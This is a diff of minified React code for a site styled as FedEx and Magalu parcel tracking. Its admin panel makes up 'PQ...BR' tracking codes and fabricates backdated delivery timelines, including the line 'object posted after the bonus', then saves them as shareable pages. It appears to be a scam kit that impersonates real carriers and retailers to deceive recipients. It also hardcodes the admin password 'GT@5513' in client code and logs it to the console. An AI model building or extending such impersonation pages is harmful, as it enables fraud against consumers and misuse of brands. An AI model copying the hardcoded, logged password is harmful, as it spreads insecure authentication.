+            children: (0, Te.jsx)("div", {
+                className: "tracking-loading",
+                children: "Carregando informações do rastreamento..."
+            })
+        });
+        const i = n || {
+                trackingCode: e.toUpperCase(),
+                recipientName: "Não encontrado",
+                address: "Não encontrado",
+                lastUpdate: (new Date).toISOString(),
+                timeline: [],
+                status: "não encontrado"
+            },
+            l = e => {
+                if (!e) return "";
+                return new Date(e).toLocaleDateString("pt-BR", {
+                    day: "2-digit",
+                    month: "2-digit",
+                    year: "numeric"
+                })
+            },
+            c = e => {
+                if (!e) return "";
+                return new Date(e).toLocaleDateString("pt-BR", {
+                    day: "2-digit",
+                    month: "2-digit",
+                    year: "numeric",
+                    hour: "2-digit",
+                    minute: "2-digit"
+                })
+            };
+        return (0, Te.jsxs)("div", {
+            className: "tracking-container",
+            children: [(0, Te.jsx)("div", {
+                className: "tracking-header",
+                children: (0, Te.jsx)("div", {
+                    className: "tracking-logo",
+                    children: s ? (0, Te.jsx)("div", {
+                        className: "logo-text",
+                        children: (0, Te.jsx)("span", {
+                            className: "logo-name",
+                            children: "FedEx"
+                        })
+                    }) : (0, Te.jsx)("img", {
+                        src: "/fedex.png",
+                        alt: "FedEx",
+                        className: "tracking-header-logo",
+                        onError: () => o(!0)
+                    })
+                })
+            }), (0, Te.jsxs)("div", {
+                className: "tracking-content",
+                children: [(0, Te.jsxs)("div", {
+                    className: "tracking-main-card",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "tracking-code-label",
+                        children: "Seu código de rastreamento é"
+                    }), (0, Te.jsx)("div", {
+                        className: "tracking-code",
+                        children: i.trackingCode || e.toUpperCase()
+                    }), "não encontrado" === i.status || "erro" === i.status ? (0, Te.jsxs)("div", {
+                        className: "tracking-error-message",
+                        children: [(0, Te.jsx)("div", {
+                            className: "error-icon",
+                            children: "⚠️"
+                        }), (0, Te.jsx)("h3", {
+                            className: "error-title",
+                            children: "Código de rastreamento não encontrado"
+                        }), (0, Te.jsxs)("p", {
+                            className: "error-text",
+                            children: ["O código ", (0, Te.jsx)("strong", {
+                                children: i.trackingCode || e.toUpperCase()
+                            }), " não foi encontrado em nosso sistema."]
+                        }), (0, Te.jsx)("p", {
+                            className: "error-text",
+                            children: "Verifique se o código está correto ou entre em contato com o suporte."
+                        })]
+                    }) : (0, Te.jsxs)(Te.Fragment, {
+                        children: [(0, Te.jsx)("div", {
+                            className: "tracking-info-section",
+                            children: (0, Te.jsxs)("div", {
+                                className: "tracking-info-item",
+                                children: [(0, Te.jsx)("span", {
+                                    className: "info-label",
+                                    children: "Destinatário:"
+                                }), (0, Te.jsx)("span", {
+                                    className: "info-value",
+                                    children: i.recipientName || "N/A"
+                                })]
+                            })
+                        }), (0, Te.jsxs)("div", {
+                            className: "tracking-address-section",
+                            children: [(0, Te.jsxs)("div", {
+                                className: "address-header",
+                                children: [(0, Te.jsxs)("svg", {
+                                    width: "16",
+                                    height: "16",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#666",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("path", {
+                                        d: "M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"
+                                    }), (0, Te.jsx)("circle", {
+                                        cx: "12",
+                                        cy: "10",
+                                        r: "3"
+                                    })]
+                                }), (0, Te.jsx)("span", {
+                                    className: "address-label",
+                                    children: "Endereço de Entrega:"
+                                })]
+                            }), (0, Te.jsx)("div", {
+                                className: "address-value",
+                                children: i.address || "Endereço não informado"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "tracking-update-bar",
+                            children: ["Última atualização em: ", l(i.lastUpdate || (new Date).toISOString())]
+                        })]
+                    })]
+                }), (0, Te.jsxs)("div", {
+                    className: "tracking-help-card",
+                    children: [(0, Te.jsx)("h3", {
+                        className: "help-title",
+                        children: "Precisa de Ajuda?"
+                    }), (0, Te.jsxs)("button", {
+                        className: "help-button support",
+                        children: [(0, Te.jsxs)("svg", {
+                            width: "20",
+                            height: "20",
+                            viewBox: "0 0 24 24",
+                            fill: "none",
+                            stroke: "currentColor",
+                            strokeWidth: "2",
+                            strokeLinecap: "round",
+                            strokeLinejoin: "round",
+                            children: [(0, Te.jsx)("path", {
+                                d: "M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"
+                            }), (0, Te.jsx)("path", {
+                                d: "M13 8H7"
+                            }), (0, Te.jsx)("path", {
+                                d: "M17 12H7"
+                            })]
+                        }), "Falar com Suporte"]
+                    }), (0, Te.jsxs)("button", {
+                        className: "help-button faq",
+                        children: [(0, Te.jsxs)("svg", {
+                            width: "20",
+                            height: "20",
+                            viewBox: "0 0 24 24",
+                            fill: "none",
+                            stroke: "currentColor",
+                            strokeWidth: "2",
+                            strokeLinecap: "round",
+                            strokeLinejoin: "round",
+                            children: [(0, Te.jsx)("circle", {
+                                cx: "12",
+                                cy: "12",
+                                r: "10"
+                            }), (0, Te.jsx)("path", {
+                                d: "M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                            }), (0, Te.jsx)("line", {
+                                x1: "12",
+                                y1: "17",
+                                x2: "12.01",
+                                y2: "17"
+                            })]
+                        }), "Perguntas Frequentes"]
+                    })]
+                }), (0, Te.jsx)("div", {
+                    className: "tracking-timeline",
+                    children: i.timeline && i.timeline.length > 0 ? i.timeline.map((e, t) => {
+                        const n = t === i.timeline.length - 1;
+                        return (0, Te.jsxs)("div", {
+                            className: "timeline-item " + (n ? "active" : ""),
+                            children: [(0, Te.jsx)("div", {
+                                className: "timeline-dot"
+                            }), (0, Te.jsxs)("div", {
+                                className: "timeline-content",
+                                children: [(0, Te.jsx)("div", {
+                                    className: "timeline-date",
+                                    children: e.dateTime ? c(e.dateTime) : l(e.date)
+                                }), (0, Te.jsx)("div", {
+                                    className: "timeline-status",
+                                    children: e.status
+                                }), (0, Te.jsx)("div", {
+                                    className: "timeline-description",
+                                    children: e.description
+                                }), e.location && (0, Te.jsxs)("div", {
+                                    className: "timeline-location",
+                                    children: [(0, Te.jsxs)("svg", {
+                                        width: "14",
+                                        height: "14",
+                                        viewBox: "0 0 24 24",
+                                        fill: "none",
+                                        stroke: "#666",
+                                        strokeWidth: "2",
+                                        children: [(0, Te.jsx)("path", {
+                                            d: "M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"
+                                        }), (0, Te.jsx)("circle", {
+                                            cx: "12",
+                                            cy: "10",
+                                            r: "3"
+                                        })]
+                                    }), e.location]
+                                }), e.sector && (0, Te.jsxs)("div", {
+                                    className: "timeline-sector",
+                                    children: [(0, Te.jsxs)("svg", {
+                                        width: "14",
+                                        height: "14",
+                                        viewBox: "0 0 24 24",
+                                        fill: "none",
+                                        stroke: "#4D148C",
+                                        strokeWidth: "2",
+                                        children: [(0, Te.jsx)("rect", {
+                                            x: "3",
+                                            y: "3",
+                                            width: "18",
+                                            height: "18",
+                                            rx: "2",
+                                            ry: "2"
+                                        }), (0, Te.jsx)("line", {
+                                            x1: "9",
+                                            y1: "9",
+                                            x2: "15",
+                                            y2: "9"
+                                        }), (0, Te.jsx)("line", {
+                                            x1: "9",
+                                            y1: "15",
+                                            x2: "15",
+                                            y2: "15"
+                                        })]
+                                    }), "Setor: ", e.sector]
+                                })]
+                            })]
+                        }, t)
+                    }) : (0, Te.jsxs)("div", {
+                        className: "timeline-item active",
+                        children: [(0, Te.jsx)("div", {
+                            className: "timeline-dot"
+                        }), (0, Te.jsxs)("div", {
+                            className: "timeline-content",
+                            children: [(0, Te.jsx)("div", {
+                                className: "timeline-date",
+                                children: l((new Date).toISOString())
+                            }), (0, Te.jsx)("div", {
+                                className: "timeline-status",
+                                children: "Seu pacote foi postado"
+                            }), (0, Te.jsx)("div", {
+                                className: "timeline-description",
+                                children: "Objeto postado após a bonificação"
+                            })]
+                        })]
+                    })
+                })]
+            }), (0, Te.jsx)("div", {
+                className: "tracking-logos",
+                children: s ? (0, Te.jsxs)("div", {
+                    className: "tracking-logos-fallback",
+                    children: [(0, Te.jsx)("span", {
+                        children: "Magalu"
+                    }), (0, Te.jsx)("span", {
+                        children: "FedEx"
+                    })]
+                }) : (0, Te.jsxs)(Te.Fragment, {
+                    children: [(0, Te.jsx)("img", {
+                        src: "/logo-magalu-azul (1).png",
+                        alt: "Magalu",
+                        className: "tracking-logo-magalu",
+                        onError: () => o(!0)
+                    }), (0, Te.jsx)("a", {
+                        href: "https://www.fedex.com/pt-br/shipping/rates/last-minute-rates.html?cmp=KNC-1009085-3-1-950-1000000-LAC-BR-ES-SearchKeywords&gclsrc=aw.ds&gad_source=1&gad_campaignid=23175507727&gbraid=0AAAAADlsr1bNoztKIG9t2R09WvnSVhiGt&gclid=Cj0KCQiA7-rMBhCFARIsAKnLKtCtAoTL6GnNuTgBOC53MPzTNyVE9cgPriWYti1fJFmH3OCG3Ug0F3kaArPQEALw_wcB",
+                        target: "_blank",
+                        rel: "noopener noreferrer",
+                        style: {
+                            display: "inline-block"
+                        },
+                        children: (0, Te.jsx)("img", {
+                            src: "/fedex.png",
+                            alt: "FedEx",
+                            className: "tracking-logo-fedex",
+                            onError: () => o(!0)
+                        })
+                    })]
+                })
+            })]
+        })
+    };
+
+    const Ca = () => {
+        const [e, t] = (0, a.useState)(!1), [n, r] = (0, a.useState)(""), [s, o] = (0, a.useState)(""), [i, l] = (0, a.useState)([]), [c, u] = (0, a.useState)(!1), [d, h] = (0, a.useState)({
+            trackingCode: "",
+            recipientName: "",
+            cep: "",
+            address: "",
+            addressNumber: "",
+            status: "postado",
+            description: "Objeto postado após a bonificação",
+            location: "",
+            date: (new Date).toISOString().split("T")[0]
+        }), [f, p] = (0, a.useState)(!1), m = re();
+        (0, a.useEffect)(() => {
+            document.title = "FedEx - Área Administrativa"
+        }, []), (0, a.useEffect)(() => {
+            "true" === sessionStorage.getItem("admin_authenticated") && (t(!0), g())
+        }, []), (0, a.useEffect)(() => {
+            if (c && !d.trackingCode) {
+                const e = y();
+                h(t => zt(zt({}, t), {}, {
+                    trackingCode: e
+                }))
+            }
+        }, [c]);
+        const g = async () => {
+            try {
+                const {
+                    data: e,
+                    error: t
+                } = await ja.from("trackings_test").select("*").order("created_at", {
+                    ascending: !1
+                });
+                if (t) {
+                    console.error("Erro ao carregar rastreamentos:", t);
+                    const e = [];
+                    for (let t = 0; t < localStorage.length; t++) {
+                        const n = localStorage.key(t);
+                        if (n && n.startsWith("tracking_")) try {
+                            const t = JSON.parse(localStorage.getItem(n));
+                            e.push(zt({
+                                code: n.replace("tracking_", "")
+                            }, t))
+                        } catch (Oa) {
+                            console.error("Erro ao carregar rastreamento:", Oa)
+                        }
+                    }
+                    return void l(e)
+                }
+                const n = (e || []).map(e => zt({
+                    code: e.code || e.trackingCode,
+                    recipientName: e.recipient_name || e.recipientName,
+                    address: e.address,
+                    lastUpdate: e.last_update || e.lastUpdate,
+                    timeline: e.timeline || [],
+                    status: e.status || "postado",
+                    verified: void 0 !== e.is_verified ? e.is_verified : e.verified
+                }, e)),
+                    r = [];
+                for (let s = 0; s < localStorage.length; s++) {
+                    const e = localStorage.key(s);
+                    if (e && e.startsWith("tracking_")) {
+                        const t = e.replace("tracking_", "");
+                        if (!n.some(e => e.code === t)) try {
+                            const n = JSON.parse(localStorage.getItem(e));
+                            r.push(zt({
+                                code: t
+                            }, n));
+                            const a = {
+                                code: t,
+                                recipient_name: n.recipientName || n.recipient_name || "",
+                                address: n.address || "",
+                                last_update: n.lastUpdate || n.last_update || (new Date).toISOString(),
+                                timeline: n.timeline || [],
+                                status: n.status || "postado",
+                                is_verified: void 0 !== n.verified ? n.verified : void 0 !== n.is_verified && n.is_verified,
+                                cep: n.cep || null
+                            };
+                            ja.from("trackings_test").upsert([a], {
+                                onConflict: "code"
+                            }).then(e => {
+                                let {
+                                    error: n
+                                } = e;
+                                n ? console.error("Erro ao migrar ".concat(t, " para Supabase:"), n) : console.log("\u2705 ".concat(t, " migrado para Supabase com sucesso!"))
+                            }).catch(e => {
+                                console.error("Erro ao migrar ".concat(t, ":"), e)
+                            })
+                        } catch (Oa) {
+                            console.error("Erro ao processar rastreamento do localStorage:", Oa)
+                        }
+                    }
+                }
+                const a = [...n, ...r];
+                l(a)
+            } catch (s) {
+                console.error("Erro ao carregar rastreamentos:", s), l([])
+            }
+        }, v = e => {
+            e.preventDefault();
+            const a = n.trim(),
+                s = "GT@5513".trim();
+            console.log("Senha digitada:", a, "Tamanho:", a.length), console.log("Senha esperada:", s, "Tamanho:", s.length), console.log("São iguais?", a === s), a === s ? (t(!0), sessionStorage.setItem("admin_authenticated", "true"), o(""), g()) : (o("Senha incorreta"), r(""))
+        }, y = () => {
+            const e = Math.floor(1e10 * Math.random()).toString().padStart(10, "0");
+            return "".concat("PQ").concat(e).concat("BR")
+        }, b = e => ({
+            postado: "Objeto postado após a bonificação",
+            movimento: "O pacote está transitando entre a agência e o centro de distribuição mais próximo",
+            transito: "Pacote em rota para o centro de distribuição regional",
+            distribuicao: "Pacote saiu para entrega",
+            entregue: "Pacote entregue com sucesso ao destinatário"
+        } [e] || ""), w = e => ({
+            postado: "Postagem",
+            movimento: "Transporte",
+            transito: "Logística",
+            distribuicao: "Distribuição",
+            entregue: "Entrega"
+        } [e] || "Processamento"), _ = e => ({
+            postado: "Seu pacote foi postado",
+            movimento: "Seu pacote está em movimento",
+            transito: "Seu pacote está em trânsito",
+            distribuicao: "Seu pacote está em distribuição",
+            entregue: "Seu pacote foi entregue"
+        } [e] || e);
+        return e ? (0, Te.jsxs)("div", {
+            className: "admin-container",
+            children: [(0, Te.jsxs)("div", {
+                className: "admin-header",
+                children: [(0, Te.jsx)("h1", {
+                    className: "admin-title",
+                    children: "Área Administrativa"
+                }), (0, Te.jsx)("button", {
+                    onClick: () => {
+                        t(!1), sessionStorage.removeItem("admin_authenticated"), r(""), l([]), u(!1)
+                    },
+                    className: "admin-logout",
+                    children: "Sair"
+                })]
+            }), (0, Te.jsxs)("div", {
+                className: "admin-content",
+                children: [(0, Te.jsx)("div", {
+                    className: "admin-actions",
+                    children: (0, Te.jsx)("button", {
+                        onClick: () => u(!c),
+                        className: "admin-button primary",
+                        children: c ? "Cancelar" : "+ Criar Nova Página de Rastreamento"
+                    })
+                }), c && (0, Te.jsxs)("div", {
+                    className: "admin-form-card",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "admin-form-title",
+                        children: "Nova Página de Rastreamento"
+                    }), (0, Te.jsxs)("form", {
+                        onSubmit: async e => {
+                            e.preventDefault();
+                            const t = (d.trackingCode || y()).trim().toUpperCase(),
+                                n = ((e, t, n, r) => {
+                                    const a = new Date(t),
+                                        s = [];
+                                    let o = "Belo Horizonte",
+                                        i = "MG";
+                                    if (n) {
+                                        const e = n.match(/(.+?)\s*-\s*([A-Z]{2})/);
+                                        if (e) o = e[1].trim(), i = e[2].trim();
+                                        else {
+                                            var l, c;
+                                            const e = n.split("-");
+                                            o = (null == (l = e[0]) ? void 0 : l.trim()) || "Belo Horizonte", i = (null == (c = e[1]) ? void 0 : c.trim()) || "MG"
+                                        }
+                                    }
+                                    if (s.push({
+                                            date: new Date(a.getTime() - 2592e5).toISOString().split("T")[0],
+                                            dateTime: new Date(new Date(a.getTime() - 2592e5).setHours(14, 0, 0, 0)).toISOString(),
+                                            status: "Seu pacote foi postado",
+                                            description: "Objeto postado após a bonificação",
+                                            location: "".concat(o, " - ").concat(i),
+                                            sector: "Postagem"
+                                        }), ["movimento", "transito", "distribuicao", "entregue"].includes(e) && s.push({
+                                            date: new Date(a.getTime() - 1728e5).toISOString().split("T")[0],
+                                            dateTime: new Date(new Date(a.getTime() - 1728e5).setHours(16, 30, 0, 0)).toISOString(),
+                                            status: "Seu pacote está em movimento",
+                                            description: "O pacote está transitando entre a agência e o centro de distribuição mais próximo",
+                                            location: "Centro de Distribuição - ".concat(o, " - ").concat(i),
+                                            sector: "Transporte"
+                                        }), ["transito", "distribuicao", "entregue"].includes(e) && s.push({
+                                            date: new Date(a.getTime() - 864e5).toISOString().split("T")[0],
+                                            dateTime: new Date(new Date(a.getTime() - 864e5).setHours(18, 0, 0, 0)).toISOString(),
+                                            status: "Seu pacote está em trânsito",
+                                            description: "Pacote em rota para o centro de distribuição regional",
+                                            location: "Unidade de Logística Regional - ".concat(o, " - ").concat(i),
+                                            sector: "Logística"
+                                        }), ["distribuicao", "entregue"].includes(e) && s.push({
+                                            date: new Date(a.getTime() - 432e5).toISOString().split("T")[0],
+                                            dateTime: new Date(new Date(a.getTime() - 432e5).setHours(8, 0, 0, 0)).toISOString(),
+                                            status: "Seu pacote está em distribuição",
+                                            description: "Pacote saiu para entrega",
+                                            location: "Agência de Distribuição - ".concat(o, " - ").concat(i),
+                                            sector: "Distribuição"
+                                        }), "entregue" === e) s.push({
+                                            date: t,
+                                            dateTime: new Date(new Date(a).setHours(14, 30, 0, 0)).toISOString(),
+                                            status: "Seu pacote foi entregue",
+                                            description: "Pacote entregue com sucesso ao destinatário",
+                                            location: "".concat(o, " - ").concat(i),
+                                            sector: "Entrega"
+                                        });
+                                    else if ("distribuicao" === e) {
+                                        const e = s[s.length - 1];
+                                        e.date = t, e.dateTime = new Date(new Date(a).setHours(10, 0, 0, 0)).toISOString(), e.description = "Pacote saiu para entrega", e.location = "Agência de Distribuição - ".concat(o, " - ").concat(i)
+                                    } else s.push({
+                                        date: t,
+                                        dateTime: new Date(new Date(a).setHours(10, 0, 0, 0)).toISOString(),
+                                        status: _(e),
+                                        description: r || b(e),
+                                        location: n || "".concat(o, " - ").concat(i),
+                                        sector: w(e)
+                                    });
+                                    return s
+                                })(d.status, d.date, d.location, d.description),
+                                r = d.addressNumber ? "".concat(d.address, ", ").concat(d.addressNumber).trim() : d.address,
+                                a = {
+                                    code: t,
+                                    recipient_name: d.recipientName,
+                                    address: r,
+                                    last_update: (new Date).toISOString(),
+                                    timeline: n,
+                                    status: d.status,
+                                    is_verified: !1,
+                                    cep: d.cep ? d.cep.replace(/\D/g, "") : null
+                                };
+                            try {
+                                console.log("Salvando rastreamento no Supabase:", t, a);
+                                const {
+                                    data: e,
+                                    error: s
+                                } = await ja.from("trackings_test").upsert([a], {
+                                    onConflict: "code"
+                                });
+                                s ? (console.error("Erro ao salvar no Supabase:", s), console.error("Detalhes do erro:", JSON.stringify(s, null, 2)), localStorage.setItem("tracking_".concat(t), JSON.stringify({
+                                    trackingCode: t,
+                                    recipientName: d.recipientName,
+                                    address: r,
+                                    lastUpdate: (new Date).toISOString(),
+                                    timeline: n,
+                                    status: d.status,
+                                    verified: !1
+                                })), alert("Salvo localmente (erro ao conectar com o servidor).")) : (console.log("\u2705 Dados salvos no Supabase com sucesso!", e), localStorage.setItem("tracking_".concat(t), JSON.stringify({
+                                    trackingCode: t,
+                                    recipientName: d.recipientName,
+                                    address: r,
+                                    lastUpdate: (new Date).toISOString(),
+                                    timeline: n,
+                                    status: d.status,
+                                    verified: !1
+                                })))
+                            } catch (s) {
+                                console.error("Erro ao salvar:", s), localStorage.setItem("tracking_".concat(t), JSON.stringify({
+                                    trackingCode: t,
+                                    recipientName: d.recipientName,
+                                    address: r,
+                                    lastUpdate: (new Date).toISOString(),
+                                    timeline: n,
+                                    status: d.status,
+                                    verified: !1
+                                })), alert("Salvo localmente (erro ao conectar com o servidor).")
+                            }
+                            h({
+                                trackingCode: y(),
+                                recipientName: "",
+                                cep: "",
+                                address: "",
+                                addressNumber: "",
+                                status: "postado",
+                                description: "Objeto postado após a bonificação",
+                                location: "",
+                                date: (new Date).toISOString().split("T")[0]
+                            }), u(!1), await g(), alert("Página de rastreamento criada! Código: ".concat(t, "\nURL: /rastreamento/").concat(t))
+                        },
+                        className: "admin-form",
+                        children: [(0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Código de Rastreamento (gerado automaticamente)"
+                            }), (0, Te.jsxs)("div", {
+                                style: {
+                                    display: "flex",
+                                    gap: "8px",
+                                    alignItems: "center"
+                                },
+                                children: [(0, Te.jsx)("input", {
+                                    type: "text",
+                                    value: d.trackingCode,
+                                    onChange: e => h(zt(zt({}, d), {}, {
+                                        trackingCode: e.target.value
+                                    })),
+                                    placeholder: "PQ2187911652BR",
+                                    className: "admin-input",
+                                    readOnly: !0,
+                                    style: {
+                                        flex: 1,
+                                        backgroundColor: "#f5f5f5",
+                                        cursor: "not-allowed"
+                                    }
+                                }), (0, Te.jsx)("button", {
+                                    type: "button",
+                                    onClick: () => {
+                                        const e = y();
+                                        h(zt(zt({}, d), {}, {
+                                            trackingCode: e
+                                        }))
+                                    },
+                                    className: "admin-button small",
+                                    style: {
+                                        padding: "10px 16px",
+                                        fontSize: "14px",
+                                        whiteSpace: "nowrap"
+                                    },
+                                    children: "🔄 Gerar Novo"
+                                })]
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Nome do Destinatário *"
+                            }), (0, Te.jsx)("input", {
+                                type: "text",
+                                value: d.recipientName,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    recipientName: e.target.value
+                                })),
+                                required: !0,
+                                className: "admin-input"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "CEP *"
+                            }), (0, Te.jsxs)("div", {
+                                style: {
+                                    display: "flex",
+                                    gap: "8px",
+                                    alignItems: "center"
+                                },
+                                children: [(0, Te.jsx)("input", {
+                                    type: "text",
+                                    value: d.cep,
+                                    onChange: async e => {
+                                        const t = (e => {
+                                            const t = e.replace(/\D/g, "");
+                                            return t.length <= 8 ? t.replace(/(\d{5})(\d{3})/, "$1-$2") : e
+                                        })(e.target.value);
+                                        h(e => zt(zt({}, e), {}, {
+                                            cep: t
+                                        }));
+                                        const n = t.replace(/\D/g, "");
+                                        8 === n.length ? setTimeout(async () => {
+                                            const e = await(async e => {
+                                                const t = e.replace(/\D/g, "");
+                                                if (8 !== t.length) return p(!1), null;
+                                                p(!0);
+                                                try {
+                                                    const e = "https://viacep.com.br/ws/".concat(t, "/json/");
+                                                    console.log("Buscando CEP:", t);
+                                                    const n = await fetch(e);
+                                                    if (!n.ok) throw new Error("HTTP error! status: ".concat(n.status));
+                                                    const r = await n.json();
+                                                    if (console.log("Resposta da API:", r), r.erro) return alert("CEP não encontrado. Por favor, verifique o CEP digitado."), p(!1), null;
+                                                    const a = [];
+                                                    r.logradouro && a.push(r.logradouro), r.bairro && a.push(r.bairro), r.localidade && a.push(r.localidade), r.uf && a.push(r.uf);
+                                                    const s = a.join(", ");
+                                                    return p(!1), {
+                                                        address: s,
+                                                        city: r.localidade || "",
+                                                        state: r.uf || ""
+                                                    }
+                                                } catch (s) {
+                                                    return console.error("Erro ao buscar CEP:", s), p(!1), alert("Erro ao buscar endereço. Verifique sua conexão e tente novamente."), null
+                                                }
+                                            })(t);
+                                            e && h(t => zt(zt({}, t), {}, {
+                                                address: e.address,
+                                                location: "".concat(e.city, " - ").concat(e.state)
+                                            }))
+                                        }, 500) : n.length < 8 && h(e => zt(zt({}, e), {}, {
+                                            address: "",
+                                            location: ""
+                                        }))
+                                    },
+                                    placeholder: "00000-000",
+                                    maxLength: "9",
+                                    className: "admin-input",
+                                    required: !0,
+                                    style: {
+                                        maxWidth: "200px"
+                                    }
+                                }), f && (0, Te.jsx)("span", {
+                                    style: {
+                                        color: "#666",
+                                        fontSize: "14px"
+                                    },
+                                    children: "Buscando..."
+                                })]
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Endereço (preenchido automaticamente) *"
+                            }), (0, Te.jsx)("textarea", {
+                                value: d.address,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    address: e.target.value
+                                })),
+                                required: !0,
+                                rows: "2",
+                                className: "admin-input",
+                                placeholder: "Endereço será preenchido automaticamente ao digitar o CEP"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Número *"
+                            }), (0, Te.jsx)("input", {
+                                type: "text",
+                                value: d.addressNumber,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    addressNumber: e.target.value
+                                })),
+                                placeholder: "123",
+                                className: "admin-input",
+                                required: !0,
+                                style: {
+                                    maxWidth: "150px"
+                                }
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Status *"
+                            }), (0, Te.jsxs)("select", {
+                                value: d.status,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    status: e.target.value
+                                })),
+                                className: "admin-input",
+                                required: !0,
+                                children: [(0, Te.jsx)("option", {
+                                    value: "postado",
+                                    children: "Postado"
+                                }), (0, Te.jsx)("option", {
+                                    value: "movimento",
+                                    children: "Em Movimento"
+                                }), (0, Te.jsx)("option", {
+                                    value: "transito",
+                                    children: "Em Trânsito"
+                                }), (0, Te.jsx)("option", {
+                                    value: "distribuicao",
+                                    children: "Em Distribuição"
+                                }), (0, Te.jsx)("option", {
+                                    value: "entregue",
+                                    children: "Entregue"
+                                })]
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Localização"
+                            }), (0, Te.jsx)("input", {
+                                type: "text",
+                                value: d.location,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    location: e.target.value
+                                })),
+                                placeholder: "Belo Horizonte - MG",
+                                className: "admin-input"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "form-group",
+                            children: [(0, Te.jsx)("label", {
+                                children: "Data do Evento"
+                            }), (0, Te.jsx)("input", {
+                                type: "date",
+                                value: d.date,
+                                onChange: e => h(zt(zt({}, d), {}, {
+                                    date: e.target.value
+                                })),
+                                className: "admin-input",
+                                required: !0
+                            })]
+                        }), (0, Te.jsx)("div", {
+                            style: {
+                                gridColumn: "1 / -1",
+                                display: "flex",
+                                justifyContent: "center",
+                                marginTop: "8px"
+                            },
+                            children: (0, Te.jsx)("button", {
+                                type: "submit",
+                                className: "admin-button primary",
+                                style: {
+                                    minWidth: "280px"
+                                },
+                                children: "Criar Página de Rastreamento"
+                            })
+                        })]
+                    })]
+                }), (0, Te.jsxs)("div", {
+                    className: "admin-list",
+                    children: [(0, Te.jsxs)("h2", {
+                        className: "admin-list-title",
+                        children: ["Páginas de Rastreamento (", i.length, ")"]
+                    }), 0 === i.length ? (0, Te.jsx)("div", {
+                        className: "admin-empty",
+                        children: "Nenhuma página de rastreamento criada ainda."
+                    }) : (0, Te.jsx)("div", {
+                        className: "tracking-list",
+                        children: i.map(e => (0, Te.jsxs)("div", {
+                            className: "tracking-item " + (e.verified ? "verified" : ""),
+                            children: [(0, Te.jsxs)("div", {
+                                className: "tracking-item-info",
+                                children: [(0, Te.jsxs)("div", {
+                                    className: "tracking-item-header",
+                                    children: [(0, Te.jsx)("div", {
+                                        className: "tracking-item-code",
+                                        children: e.code
+                                    }), e.verified && (0, Te.jsxs)("span", {
+                                        className: "verified-badge",
+                                        children: [(0, Te.jsx)("svg", {
+                                            width: "16",
+                                            height: "16",
+                                            viewBox: "0 0 24 24",
+                                            fill: "none",
+                                            stroke: "currentColor",
+                                            strokeWidth: "2.5",
+                                            strokeLinecap: "round",
+                                            strokeLinejoin: "round",
+                                            children: (0, Te.jsx)("path", {
+                                                d: "M20 6L9 17l-5-5"
+                                            })
+                                        }), "Verificado"]
+                                    })]
+                                }), (0, Te.jsx)("div", {
+                                    className: "tracking-item-name",
+                                    children: e.recipientName || "N/A"
+                                }), (0, Te.jsx)("div", {
+                                    className: "tracking-item-address",
+                                    children: e.address || "N/A"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "tracking-item-actions",
+                                children: [(0, Te.jsx)("button", {
+                                    onClick: () => m("/rastreamento/".concat(e.code)),
+                                    className: "admin-button small",
+                                    children: "Ver"
+                                }), (0, Te.jsx)("button", {
+                                    onClick: () => (e => {
+                                        const t = "".concat(window.location.origin, "/rastreamento/").concat(e);
+                                        navigator.clipboard.writeText(t).then(() => {
+                                            alert("Link copiado para a área de transferência!")
+                                        })
+                                    })(e.code),
+                                    className: "admin-button small",
+                                    children: "Copiar Link"
+                                }), (0, Te.jsx)("button", {
+                                    onClick: () => (async e => {
+                                        try {
+                                            const {
+                                                data: t,
+                                                error: n
+                                            } = await ja.from("trackings_test").select("is_verified").eq("code", e).single();
+                                            if (n) {
+                                                console.error("Erro ao buscar rastreamento:", n);
+                                                const t = localStorage.getItem("tracking_".concat(e));
+                                                if (t) try {
+                                                    const n = JSON.parse(t);
+                                                    n.verified = !n.verified, localStorage.setItem("tracking_".concat(e), JSON.stringify(n))
+                                                } catch (Oa) {
+                                                    console.error("Erro ao atualizar status:", Oa)
+                                                }
+                                                return void await g()
+                                            }
+                                            const {
+                                                error: r
+                                            } = await ja.from("trackings_test").update({
+                                                is_verified: !t.is_verified
+                                            }).eq("code", e);
+                                            r && console.error("Erro ao atualizar no Supabase:", r)
+                                        } catch (s) {
+                                            console.error("Erro ao atualizar status:", s)
+                                        }
+                                        await g()
+                                    })(e.code),
+                                    className: "admin-button small " + (e.verified ? "verified-button" : "verify-button"),
+                                    children: e.verified ? (0, Te.jsxs)(Te.Fragment, {
+                                        children: [(0, Te.jsx)("svg", {
+                                            width: "14",
+                                            height: "14",
+                                            viewBox: "0 0 24 24",
+                                            fill: "none",
+                                            stroke: "currentColor",
+                                            strokeWidth: "2.5",
+                                            strokeLinecap: "round",
